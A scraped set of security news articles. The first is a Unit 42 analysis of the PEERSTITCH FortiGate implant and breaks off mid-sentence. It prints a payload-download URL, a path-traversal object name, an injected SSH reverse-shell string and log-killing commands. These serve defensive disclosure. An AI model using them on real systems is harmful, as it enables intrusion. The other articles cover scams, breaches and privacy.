articles.title: Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant
articles.raw_content:
Threat Research Center

By: Daniel Gott Shawn Westfall

Published: October 14, 2026

Categories: Malware Threat Research

Tags: Apache CL-STA-0954 Logging Network intrusion Network Sniffer Payload Reverse shells VPN

Network intrusion

Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance.

From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.

Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:

Maintained long-term access

Intercepted network traffic

Established VPN sessions

Deployed backdoors

Exploited a separate privilege-escalation vulnerability

The attackers exploited another vulnerability, CVE-2025-61624 , via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.

PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.

The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.

Palo Alto Networks customers are better protected from this activity through the following products and services:

Advanced WildFire

Advanced URL Filtering , Advanced DNS Security and Advanced IP Defense

Next-Generation Firewall with the Advanced Threat Prevention

If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.

We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.

Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.

During the initial phase of the intrusion, the attackers exploited CVE-2024-47575 (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the FMG-Access (TCP port 541) management channel.

During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named localhost (serial number FMG-VMTM23017412 ) to the central FortiManager instance, originating from external attacker infrastructure ( 45.32.41[.]202 , later modified to 198.199.122[.]22 ).

Immediately following device registration, the attacker generated a configuration archive named .tm in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:

The FortiManager appliance's own serial number and its management relationships to every enrolled device

Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks

Central management SQLite databases: global.db (containing administrative domains, global objects and policy packages) and revinfo.db (containing device revision metadata)

A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses

Internal network topology maps, routing tables and interface configurations

Ciphertext administrative, local and SSL/VPN credentials

Encoded cryptographic trust material, including public certificates and private keys

Following an extended dwell period, the attackers pivoted to active network reconnaissance. They used the compromised FortiManager device to push unauthorized sniffer configurations to multiple downstream managed FortiGate firewalls.

The packet captures targeted unencrypted HTTP traffic and 11 specific services over different TCP ports to intercept sensitive communications and map network perimeters. Table 1 below shows the characteristics of these services.

Table 1. Services the attackers used to intercept sensitive communications and map network perimeters.

In a subsequent phase of reconnaissance, attackers deployed additional packet-capture rules to core perimeter firewalls targeting:

UDP port 69 (TFTP): File, communications, firmware and configuration capture

UDP ports 1812 and 1813 (RADIUS and RADIUS-Accounting): Network authentication sniffing

TCP port 389 (LDAP): Active Directory query interception and directory enumeration

The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.

Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure ( 23.240.77[.]233 and 47.18.167[.]159 ). These sessions granted the attackers authenticated access into internal network-management segments.

During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin , operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.

The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.

The sanitized event below highlights the creation of the traversal object ../../../../setup used to drop the PEERSTITCH initial-stage loader shown below in Figure 2.

PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc . It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:

/bin/miglogd : The central system and traffic logging daemon

/bin/iked : The IKE/IPsec VPN service daemon handling cryptographic negotiation

Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.

1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls

2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/ :

pM.js : Environment preparation script (self-deleting)

a.js (saved as index.js ): Emscripten JavaScript runtime module

a .wasm (saved as index.wasm ): Compiled WebAssembly binary module

b.js (saved as ipssem.js ): Deployment orchestrator script

dd (saved as lldprx ): Native ARM64 ELF binary injector (PEERSTITCH core)

3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js

The lldprx binary performs a single-pass execution sequence:

Process discovery: Iterates through /proc/ , parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked

Memory layout enumeration: Reads /proc/<pid>/ maps to extract the base addresses and memory boundaries of both target daemons

Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT

Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers ( X0 through X30 ), the stack pointer ( SP ) and program counter ( PC )

Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall ( X8 = 0xDE ) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS

Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem

Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked .

Figure 4 shows a flowchart for PEERSTITCH network traffic.

Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers: TCP port marker: 8550 (embedded within traffic data, not a listening port) IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)

TCP port marker: 8550 (embedded within traffic data, not a listening port)

IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)

Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0

Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem , writing the extracted tag directly into the other daemon's memory.

Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch ( ADRP return path), bypassing default FortiOS security validations.

To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches ( 0xAA0003E0 , corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:

base + 0x106F7B8

base + 0x1072E20

base + 0x109A570

A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.

Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment ( ACME ) protocol.

The attackers pushed an auto-script object to create ../../tmp/apache2/conf/md-acme.conf , as shown below in Figure 6.

1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server , explicitly routing ACME directory requests to external infrastructure

2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server

3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node . When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands ( kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i ) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.

4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node , this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.

FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.

Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.

We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:

Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number

Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager

Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008 , consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.

We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:

The related single sign-on (SSO) issues tracked under FG-IR-26-060

Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.

The attackers took extensive measures to eliminate forensic artifacts:

Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts

Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts

Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects ( ../../../../setup ) shortly after execution

Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file ( #0 certs managed by ACME\n\n\n ) to mask reverse-shell configuration files

Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting

Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including termina

articles.title: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk
articles.raw_content:
Threat Research Center

Anatomy of an Attack

By: Antonio Diaz Ruben Castillo

Published: October 13, 2026

Categories: Anatomy of an Attack Insights

Anatomy of an Attack

Tags: Credential-based attacks Incident response Reconnaissance

Credential-based attacks

Incident response

When unusual activity was detected on a European bank’s central IT system, its internal security team quickly recognized that the incident warranted immediate response. They discovered unauthorized VPN-based access attempts that spanned several months. They then engaged Unit 42 to determine the full scope of the intrusion, identify any persistent footholds and secure the environment.

While the activity appeared to be a stealthy cyberespionage campaign, the actual intrusion was made possible by gaps in foundational security controls. Rather than relying on novel techniques, the threat actor succeeded through persistence, exploiting weaknesses that stronger identity protections and basic security hygiene could have prevented. The case highlights an important lesson: Sometimes the most damaging intrusions begin with the simplest oversights.

The intrusion originated through a third-party-managed external gateway appliance that was not properly configured to enforce strict authentication. Using compromised credentials, the attacker began by authenticating to internal systems. Once inside, the threat actor launched a discovery campaign of the internal network.

The threat actor conducted multiple rounds of reconnaissance, performing extensive host and network scans across a wide range of protocols and interacting with thousands of systems. This broad, noisy approach was less a targeted strike than casting a net to uncover as many access points as possible.

The pattern continued with credential testing. Over a period of a few months, the threat actor launched multiple password-guessing campaigns. They hammered at internal systems with brute-force authentication attempts, focusing on administrator accounts.

While doing this, they systematically targeted internal documentation and data shares. Using automated web requests, they scraped individual pages and attachments from internal systems and enumerated various operational and network shares.

The activity observed did not match the behavior typically associated with a sophisticated threat actor. The noise behind the scanning and login attempts, along with using common system identifiers, pointed to an opportunistic attacker attempting to compromise multiple systems. Their actions showed little effort to remain hidden or avoid detection.

In the final stages, the intruder attempted to expand control by exploiting a Windows Server Update Services (WSUS) remote code execution vulnerability on the central configuration management server. This server handled software distribution across the bank, making it a prime target for privilege escalation and long-term persistence.

However, the attacker's luck ran out. The moment they attempted to execute unauthorized code, Cortex XDR identified the activity and contained the threat before it could escalate. The attacker was prevented from gaining a persistent foothold or moving laterally throughout the network.

When Unit 42 engaged, our team initiated a comprehensive threat-hunting effort. We performed a deep forensic review of endpoint telemetry across approximately thousands of systems, alongside logs from dozens of Windows and Linux servers. Ultimately, no additional attacker presence or persistent backdoors were found. Bank leadership acted quickly to review the exposed documentation and rotate all compromised credentials, completely neutralizing the threat.

This case serves as a critical reminder that not every cyber threat is advanced and multifaceted. Opportunistic actors will gladly take advantage of simple oversight, such as missing multi-factor authentication (MFA) on a VPN or an unpatched edge device, to compromise and break into an environment. That being said, an attacker's lack of sophistication doesn't make them harmless.

Defending against this type of intrusion relies on foundational security hygiene and swift response. This includes:

Enforcing strict identity access controls

Ensuring timely patching

Using endpoint detection to stop lateral movement

By pairing timely containment with thorough threat hunting, the organization prevented the intrusion from turning into a catastrophic event.

Unit 42 independently validated the incident to confirm the root cause, restoring leadership confidence through strategic guidance and complete incident management. Beyond resolving the immediate threat, we delivered specific, prioritized recommendations to harden the bank's security posture. To ensure enhanced protection, the organization expanded its defensive coverage by deploying additional Cortex XSIAM and Cortex XDR licenses and broadening its incident response retainer service.

Interested in learning more about the latest attack trends? If so, take a look at our Unit 42 Global Incident Response Report , which distills the most critical findings based on our direct experience responding to over 750 real-world cyberattacks across the globe.

articles.title: 13.3 million people’s medical data exposed; companies pay $300,000
articles.raw_content:
The New York attorney general (AG) has reached a settlement over a medical data breach that affected 13.3 million people after basic security failures.

Perry Johnson & Associates (PJ&A) and four related companies have agreed to pay $300,000 and implement extensive security reforms following a breach that exposed personal and medical information belonging to more than 13.3 million people. They face another $9.7 million in penalties if they fail to meet the settlement’s terms.

New York AG Letitia James announced the agreement on November 6, alongside the attorneys general of Connecticut, Michigan, and New Jersey. Approximately 4.2 million of the people affected were New York residents.

The investigation describes a series of failures: remote access without multifactor authentication , nearly identical passwords circulated by email, sensitive files without file-level encryption, and security software that detected malicious activity but did not alert security staff.

The result: the companies only discovered the attack when the attackers contacted them on May 2, 2023, and demanded payment.

The stolen database files contained records associated with more than 13.3 million people, including approximately 4.2 million New Yorkers.

Earlier reporting put the number of affected patients at approximately 8.95 million. The settlement documents now give the larger figure of more than 13.3 million. The total could be higher, since the AG found that attackers also accessed files in shared network storage containing personal and health information, but the companies did not review those files to identify additional affected people.

The information included:

Names, dates of birth, and home addresses.

Social Security numbers.

Medical record and hospital account numbers.

Insurance information.

Admission diagnoses and dates of treatment.

Clinical information from medical transcriptions, including test results, medications, treatment facilities, and healthcare providers.

Notifications were also slow. PJ&A began contacting clients about the stolen database files in July 2023, and its clients notified affected individuals between October 31, 2023, and February 8, 2024. The New York AG found that the companies violated state requirements to disclose a breach as quickly as possible and without unreasonable delay.

Although the announcement describes a settlement worth up to $10 million, the companies must pay $300,000 in penalties to the states. The remaining $9.7 million is suspended and could become payable. New York will receive $100,000 from the initial payment. These are payments to the states, not an announced compensation payout to patients.

The exposed information could be valuable to criminals. Our research found stolen identity packages selling for as little as 95 cents apiece on the dark web .

The settlement also requires extensive security changes for the relevant active companies, including:

MFA for individual user accounts, including administrator accounts, and remote network access.

Stronger password management and access restricted to what employees need for their jobs.

Encryption of personal and protected health information.

Monitoring that automatically alerts security personnel to suspicious activity.

Annual risk assessments and penetration testing.

Network segmentation and measures to detect and prevent unauthorized data transfers.

Written incident response procedures and clearer rules for retaining and securely disposing of sensitive information .

Given the carelessness, number of exposed records and people, do you think the companies got off cheap? Let us know in the comments.

A breach does not automatically mean someone has misused your information, but you can take these precautions while you wait for more details:

Verify unexpected messages independently. Don’t let a message about the breach rush you into clicking a link, sharing sensitive information, or making a payment. Go to your healthcare provider or insurer’s official website yourself or use contact details you already trust.

Review medical bills and insurance statements. Look for appointments, tests, prescriptions, or services you did not receive. The Federal Trade Commission (FTC) identifies unfamiliar medical bills and unexpected items on an Explanation of Benefits statement, which explains how your insurer processed a claim, as warning signs of medical identity theft. Report discrepancies to your healthcare provider and your insurer.

Review your credit reports. Look for unfamiliar accounts or debts and dispute errors. Free reports are available through AnnualCreditReport.com .

Act if you find signs of identity theft. Visit IdentityTheft.gov for a recovery plan. If someone has received care in your name, ask the providers involved for copies of your medical records and request corrections in writing.

Medical identity theft is not just a financial problem; it can also affect your care. Someone using your identity to obtain treatment or submit insurance claims could introduce incorrect information into your health records. Checking medical statements and reporting anything unfamiliar can help you catch that misuse.

articles.title: Big Tech sues over California plan to limit kids’ scrolling
articles.raw_content:
California wants to switch off autoplay and personalized feeds for under-16s.

Google, Meta, and TikTok are suing to stop the restrictions.

Age checks could raise privacy concerns for adults, too.

Google, Meta, and TikTok filed separate federal lawsuits on November 4, challenging Assembly Bill 1709 , which Governor Gavin Newsom signed in September.

The companies argue that the law, due to take effect in 2027, interferes with free speech, overrides parents’ decisions, and conflicts with federal protections for online platforms.

AB 1709 prohibits covered platforms from providing California users under 16 certain

“psychologically exploitative features intended to maximize engagement that foreseeably lead to compulsive use.”

The law specifically includes personalized “addictive feeds” and autoplay. It also allows the attorney general to define additional features through regulations.

It would not ban children from using the platforms. They can keep their accounts if the platform removes the restricted features. Otherwise, the platform must delete the account and associated personal information .

The law also requires age verification before providing the restricted features. The law doesn’t stop children from searching for videos, following creators, or communicating privately. It makes exceptions for certain search-based results, content that a user explicitly requests, and direct private messages, subject to conditions.

California’s argument is that harm is not limited to what children see. It can also arise from how a service encourages them to keep using it, through personalized recommendations and features such as autoplay.

The idea behind the law is straightforward: Instead of relying entirely on teenagers to recognize when to stop, require platforms to remove some of the mechanisms designed to keep them engaged.

The companies’ objections fall into several related categories.

Meta argues that deciding which posts to show, and how to arrange them, is protected editorial judgment under the First Amendment. Its complaint accuses California of attempting to appoint itself the

“editor, curator, and controller of online speech.”

TikTok makes a similar argument about its For You feed. It says selecting and arranging videos creates a curated product protected by free-speech rights, not merely a mechanism that the state can redesign at will.

Google likewise argues that YouTube’s recommendations help users find relevant, appropriate material among its vast collection of videos. It also defends autoplay as useful for watching content intended to be viewed in sequence.

The central disagreement is whether these are harmful product features that California can regulate, or editorial decisions protected by free-speech rights. California describes them as potentially harmful product design; the companies describe them as protected decisions about publishing speech.

The companies also raise parental control . Google says parents are best placed to decide what is appropriate for their families. TikTok points to its existing teen-account safeguards and Family Pairing controls, arguing that the law restricts free expression while taking decisions away from parents. Meta adds that personalized features can help deliver age-appropriate experiences.

There is also a commercial interest at stake: engagement. How often people return, how long they stay, and how much they interact all matter to the platforms’ businesses.

Meta’s annual report says it generates substantially all its revenue from advertising. It also says that changes to its content displays and product features can affect time spent, user engagement, and financial results. That doesn’t establish why the companies sued, but it helps explain why restrictions on recommendations and autoplay could have financial consequences.

If removing these features leads people to spend less time on a service, it could mean fewer opportunities to show ads. Compliance would also require product and operational changes, such as checking users’ ages and providing a different experience to those under 16.

Youth is the future. Big Tech is very much aware of this. Meta’s annual report identifies youth as an investment priority and describes attracting and retaining users as a competitive objective. Restrictions affecting how young people join and use a platform could affect its longer-term audience strategy, too.

California is challenging an important part of the attention-based business model. Meta’s annual report warns investors that regulation affecting how it displays content or serves younger users could affect user growth, engagement, and financial results.

And then there’s the matter of age verification. The required age checks could affect adults as well as children: a service must verify users’ ages before providing the restricted features. Depending on how the checks work, this could involve sharing age-related information, raising privacy concerns and creating another opportunity for sensitive data to be exposed in a breach.

If it were up to me, platforms would stop designing for compulsive use, whatever the user’s age. Adults deserve a healthier online experience too. Applying those protections to everyone would also remove the need to check someone’s age before deciding whether they can use these features. Platforms might lose some advertising opportunities, but time spent online should not be the only measure of a successful service.

Scammers don’t need to hack you. They just need you to click once.

articles.title: Attacks on supermarket and blood storage systems prompt US warning
articles.raw_content:
Attackers don’t have to steal information to cause serious harm. Sometimes, changing a temperature setting is enough.

On November 5, the US Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and three other federal agencies issued a warning urging operators to secure industrial refrigeration and cold-chain monitoring systems.

The warning follows cyberattacks on supermarket refrigeration systems across Europe. Separately, France’s national blood service confirmed that the monitoring and control systems at three of its cold-storage sites had been affected. Staff intervened before any blood products or samples were compromised. The incident showed how a connected cooling system can put essential supplies at risk.

On October 13, after the first attacks in France , refrigeration supplier Danfoss advised its Dutch customers to disconnect their systems from the public internet and reconnect only through a secure network.

A Danfoss spokesperson told NOS that most stores followed the advice. When similar attacks reached the Netherlands on November 2, major supermarket chains were reportedly unaffected. At least 17 businesses, mainly butcher shops and small neighborhood stores, had their refrigeration systems compromised.

Danfoss said that the affected systems were still accessible through unsecured connections and used default passwords. The spokesperson said the attacks could have been prevented if the recommended precautions had been taken.

CISA and its partners warned that attackers may exploit authentication bypass flaws, code-injection vulnerabilities, or weak configurations in refrigeration controllers. Successful attacks could let them change temperatures or force equipment into continuous heating or defrost cycles.

The agencies recommend reducing that risk by keeping control panels off the public internet, isolating operational equipment from business networks, changing default passwords, using strong authentication, patching firmware , and replacing unsupported devices. They also recommend setting safe operating limits and alerts for temperature changes outside those limits.

You don’t need an industrial refrigeration unit to adopt some of these precautions.

Check whether you need remote access. If you never use a device while away from home, disable that feature. Check the manufacturer’s instructions first; disabling remote access may also affect alerts or smart-home integrations.

Check who can access the appliance, including suppliers, and how that access is protected.

Change default passwords and secure the associated account. Use a strong password and enable two-step verification wherever the appliance or app supports it. Protecting the app account matters as well as protecting the appliance itself.

Keep firmware and apps updated. Turn on automatic updates where available, and don’t ignore manual update prompts.

articles.title: Phone return scams: where a real delivery and a fake return end up in a bill for you
articles.raw_content:
A caller offers you a free phone upgrade or an exclusive deal from your mobile provider. A new phone arrives at your home. So far, everything seems to check out.

Then comes another call: There’s been a shipping mistake. You received the wrong phone, and the company needs you to send it back. You send it back, but the phone never reaches your provider, leaving you with a large charge or long-term contract to pay.

Now police are warning about this scheme after residents lost devices and were left facing the associated payments.

The scam usually starts with a call from a spoofed number. In the US we’re seeing several examples in anonymized Malwarebytes Scam Guard records of the impersonated company being Canadian mobile provider Rogers.

The Canadian Anti-Fraud Centre warns:

“After collecting personal information required for credit checks, they’ll order a new phone in your name.”

Next, a genuine device arrives through a legitimate delivery service. That delivery makes the next part of the story easier to believe.

The caller gets back in touch and claims something went wrong. Perhaps the company sent the wrong device, or an extra phone arrived by mistake. To put things right, you need to send it back using the label or shipping QR code they provide.

The shipping label is the real trick. Rather than directing the package to the provider’s returns facility, it sends the device to an address chosen by the criminals.

The result: You no longer have the phone, but your provider has not received it back. Victims can be left facing a contract, financing agreement, or monthly payments for the missing device.

The most important protection against most types of scams is having someone you can trust and help you decide whether something is a scam. Malwarebytes Scam Guard can be that partner if you’re on your own.

You don’t need to decide on the spot about whether a caller sounds convincing. Break the conversation and verify the offer separately. Pause and check if you encounter any of the following:

An unexpected call offering a free phone, loyalty reward, or unusually attractive upgrade.

A caller asking for personal, financial, or account information to arrange the offer.

A follow-up call claiming the wrong device was shipped or that another delivery mistake needs correcting.

Instructions to use a return label or QR code supplied by that caller.

A return destination that you have not confirmed directly with your provider.

If you’ve already sent a phone, contact your mobile provider immediately using verified contact details. Explain that you believe you were targeted by a phone return scam, identify the affected orders, and ask for a fraud investigation.

If you shared your account password or PIN, change it through the provider’s official channels. Rogers advises customers who disclosed their credentials to reset them and contact customer service to check for unauthorized transactions.

Keep the evidence: messages, emails, the shipping label, tracking details, order confirmations, bills, and a timeline of the calls. These records can help support a billing complaint and fraud report.

articles.title: NIKKE PC launcher compromise put players’ passwords and personal files at risk
articles.raw_content:
Players of Goddess of Victory: NIKKE are being urged to check their PCs after attackers tampered with files used by the game’s Windows launcher. Opening the launcher could allow malicious software to run, potentially exposing much more than a player’s game account.

The incident occurred as part of a supply-chain attack, where services or software used by the company in question is compromised. In practice, this meant that instead of persuading players to download a fake game or install a suspicious add-on, the attackers compromised resources used by the legitimate launcher. Players could therefore encounter the threat simply by opening software they already trusted.

Game publisher Level Infinite has released fixes and added a malware-checking feature to the official PC client. However, fixing the delivery mechanism does not undo an infection, nor does it recover passwords and other information that may have been stolen.

Independent researcher MotherSphere identified malicious code in four JavaScript files hosted on Level Infinite’s official content delivery network (CDN).

Players should be aware of a discrepancy in the published timelines. Level Infinite says malicious-program distribution began on October 30, while MotherSphere reports evidence of the remote-control agent running as early as October 23.

According to the researcher’s analysis, the distributed remote-control agent supported commands to:

Run programs and system commands.

Browse folders and download files.

Take screenshots.

Retrieve saved NIKKE login credentials.

Collect browser passwords and cookies.

Search for developer credentials, API tokens, and other secrets.

Collect cryptocurrency wallet-extension data.

The number of compromised PCs and the full extent of any data theft remain unclear.

Mobile-only players are not affected, according to Level Infinite , so they do not need to take any additional security measures.

Level Infinite says it replaced three abnormal script files early on November 4, then refreshed the CDN’s cache for the remaining file later that day. MotherSphere subsequently reported that all four files were clean on the four CDN servers checked.

If you opened the Windows launcher during the period identified above, take the following steps.

Close the launcher and check your PC . MotherSphere’s report includes user-reported Malwarebytes detections for traces associated with the attack.

Follow the removal instructions published by NIKKE carefully.

Secure your accounts from a clean device. Do not change passwords on a computer that may still be compromised.

If a cryptocurrency wallet or its recovery phrase may have been exposed, use a clean device to move funds to a newly created wallet with a new recovery phrase.

Level Infinite asks players who believe they were affected, including those experiencing problems with external accounts or financial losses, to contact its customer support team, so keep relevant records without handing over personal information.

Please note that the NIKKE wiki’s unofficial cleanup guidance recommends scanning with Malwarebytes. Although the guide describes this as a one-time free option, Malwarebytes Free lets you continue running manual scans and removing detected malware after the Premium trial ends. The trial provides additional features, including real-time protection, so decide what is best for you.

articles.title: Scammers use AI-generated images of missing pets to extort owners
articles.raw_content:
When your pet goes missing, it can be totally heartbreaking.

So hearing that they’ve been found is no doubt very welcome news. Even better to see a photo of them looking safe and well.

But while the photo may look exactly like your pet, that doesn’t mean the person who sent it has your pet or even ever saw it.

The BBC reports how criminals are sending owners AI-generated images of their missing pets, demanding money for their return, and sometimes threatening to harm the animals when owners refuse to pay.

The BBC interviewed two targets of this scam who were both contacted after posting a missing pet message on social media. The scammers sent them pictures of their beloved pets and demanded a ransom for their safe return.

Messages like these exploit two powerful emotions in quick succession: relief that a beloved pet has been found, followed by fear that something terrible will happen unless the owner acts immediately.

The scam typically follows this pattern:

A scammer finds a missing pet appeal, which is typically posted to social media or local sites with an accompanying photo and contact details.

The scammer contacts the owner and claims to have found the animal. An image fabricated with the help of AI makes the claim appear more convincing.

They ask for money which may be described as a reward or as payment for emergency treatment .

They add pressure. They might refuse to meet until payment arrives, or threaten to sell or harm the pet.

Our data backs this report up. Over the last month, people anonymously submitted three distinctive types of pet related scam attempts to Malwarebytes Scam Guard :

“We found your missing cat” message, with photos: Someone claimed to have found a user’s missing cat and had images of it.

Found pet callback lure: A voicemail claimed to have found a lost cat and supplied a callback number.

Humane Society impersonation and payment demand: A caller claimed a missing cat needed emergency surgery, and demanded successive Zelle payments.

Sadly, while it can be very useful to use social media to retrieve lost pets, it also attracts scammers and other abuse.

You don’t have to stop asking for help online, but you can put some safeguards between an unexpected message and any payment.

Keep some identifying details private. Leave a distinctive feature out of the public description so you can ask a supposed finder about it later.

Do not pay in advance to secure a reunion. Be particularly wary of someone who insists that you send money before they will let you see the animal. Arrange any legitimate handover in a safe, public location, and verify that it is your pet before paying a reward.

Verify veterinary claims independently. If someone says your pet is at an animal hospital, find the hospital’s contact details yourself and call it directly. Do not rely on the number or payment link in the message.

A second pair of eyes can help you assess a demand without the same emotional pressure. Malwarebytes Scam Guard can help you identify whether a message might be a scam and how to proceed.

If someone is threatening your pet, remember that when they make threats to your pet, it is very likely they don’t have a clue where it is either, so don’t let them extort you.

articles.title: Vizio, Samsung smart TVs seem to ignore tracking opt outs
articles.raw_content:
Automatic Content Recognition (ACR) sends viewing data from your smart TV to third parties.

Vizio and Samsung TVs both appeared to send this data even when researchers opted out of ACR.

Only four out of eight smart TVs appeared to completely honor ACR opt-out.

If you thought that opting out of surveillance on your smart TV would give you your privacy back, think again.

A study by researchers at Northeastern University found that some smart TVs still seem to send information about what you’re watching to third parties, even after you pressed the opt-out button.

The study, ‘ Watching the watchers ‘, tested twelve smart TVs from ten manufacturers to find out how well they respected opt-outs from automatic content recognition (ACR). ACR is a TV feature that captures audio and/or video content from smart TVs and uploads it to a third party (typically the TV manufacturer).

The third party converts this content into digital fingerprints to understand what you’re watching, and can then use it to send targeted advertising or allow others to do the same. It’s on most if not all smart TVs, and 82% of US households had a smart TV as of last year.

The test took in the eight operating systems behind roughly 95% of US smart TVs, and ran ten viewing scenarios on each of them. These ranged from viewing antenna TV through to viewing via screen mirroring from another device. The researchers tested viewing the first-party streaming services provided free with the manufacturers’ operating systems, along with sessions using third-party streaming apps. And they tested sessions where the TV was connected to another device via its HDMI port.

The study ran all of its tests both with ACR left on, and with the opt-out setting selected. The whole test involved over 5,000 automated sessions.

